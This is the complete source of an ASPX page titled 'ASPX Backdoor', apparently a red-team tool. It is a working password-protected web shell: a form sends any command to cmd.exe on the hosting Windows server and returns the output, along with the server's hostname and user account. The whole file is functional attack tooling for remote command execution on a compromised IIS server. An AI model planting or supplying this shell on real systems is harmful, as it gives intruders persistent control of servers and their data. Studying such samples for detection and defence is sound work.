<%@ Page Language="C#" Debug="false" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">

    // =====================================================================
    // Setup global password necessary to pass before using that webshell.

    public string Password = "5eQzrXZHZwJNLvm6Q2b7PR6r";
    
    // =====================================================================

    void Page_Load(object sender, EventArgs e)
    {
        PasswordTextbox.Attributes["value"] = Request.Form["PasswordTextbox"];
        PasswordTextbox.Attributes["type"] = "password";
        PasswordTextbox.Text = Request.Form["PasswordTextbox"];
        CommandTextbox.Value = Request.Form["CommandTextbox"];
    }

    string ExecuteCommand(string arg)
    {
        if (arg.Length >= 1)
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c \""+ arg + "\"";
            psi.RedirectStandardOutput = true;
            psi.UseShellExecute = false;
            Process p = Process.Start(psi);
            StreamReader stmrdr = p.StandardOutput;
            string s = stmrdr.ReadToEnd();
            stmrdr.Close();
            return s;
        }
        return "";
    }
    
    void Launch_OnClick(object sender, System.EventArgs e)
    {
        if (Request.Form["PasswordTextbox"] == Password) 
        {
            string h = Server.HtmlEncode(ExecuteCommand("hostname")).Trim();
            string u = Server.HtmlEncode(ExecuteCommand("whoami")).Trim();

            Hostname.Text = u + "@" + h;
            CommandOutput.InnerHtml = Server.HtmlEncode(ExecuteCommand(Request.Form["CommandTextbox"]));
        }
        else 
        {
            Hostname.Text = "unknown";
            CommandOutput.InnerHtml = "Wrong password provided.";
        }
    }

</script>
<!DOCTYPE html>
<html>
    <head>
        <title>ASPX Backdoor</title>
        <script>
            function setPassword()
            {
                document.getElementById("PasswordTextbox").type = 'password';
            }
        </script>
    </head>
    <body onload='setPassword()'>

        <h3>ASPX Backdoor.</h3>
        <i style="font-size:9px">You need to provide valid password in order to leverage RCE.</i>
        <br/>
        <font style="font-size:5px" style="font-style:italic;color:grey">coded by <a href="https://github.com/mgeeky">mgeeky</a></font>
        <br/>
        <hr/>
        <form id="cmd" method="post" runat="server">
        <table style="width:100%">
            <tr>
                <td width="40%">
                    <b style="color:red">Password:</b>
                </td>
                <td width="60%">
                    <asp:TextBox runat='server' id="PasswordTextbox" style="width:30%"></asp:TextBox>
                </td>
            </tr>
            <tr>
                <td width="40%">
                    <b style="color:blue"></b>
                    <asp:Label id="Hostname" runat='server'></asp:Label>
                </td>
                <td width="60%">
                    <input type=text id="CommandTextbox" runat="server" value='' onClick="" style="width:80%" onkeydown="if (event.keyCode == 13) { this.form.submit(); return false; }"/>
                </td>
            </tr>
            <tr>
                <td width="40%">
                </td>
                <td width="60%">
                    <asp:Button id="Launch" runat="server" Text="Execute" OnClick="Launch_OnClick"></asp:Button>
                </td>
            </tr>
        </table>
        </form>
        <hr />
        <pre id="CommandOutput" runat='server' style="background-color:black;color:lightgreen;padding: 5px 25px 25px 25px;"></pre>
    </body>
</html>
